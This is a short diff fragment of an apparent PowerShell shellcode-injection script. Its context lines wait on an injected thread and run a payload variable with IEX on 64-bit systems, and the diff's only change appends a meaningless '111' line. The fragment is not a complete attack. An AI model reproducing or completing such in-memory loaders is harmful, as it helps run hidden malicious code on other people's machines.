@@ -41,3 +41,4 @@ $result2 = [inject.func]::WaitForSingleObject($thread, [inject.func+Time]::Infin
 If ([IntPtr]::size -eq 8) {
 	IEX $DoIt
 }
+111
